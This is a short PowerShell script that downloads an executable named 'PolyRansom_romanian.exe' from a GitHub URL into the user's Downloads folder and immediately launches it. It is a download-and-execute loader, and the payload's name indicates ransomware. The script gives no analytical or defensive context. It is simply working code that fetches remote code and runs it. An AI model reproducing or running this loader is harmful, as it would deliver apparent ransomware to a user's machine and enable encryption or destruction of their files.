$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $downloadPath)
if (Test-Path $downloadPath) {
    Start-Process -FilePath $downloadPath -Wait
    exit
} else {

}
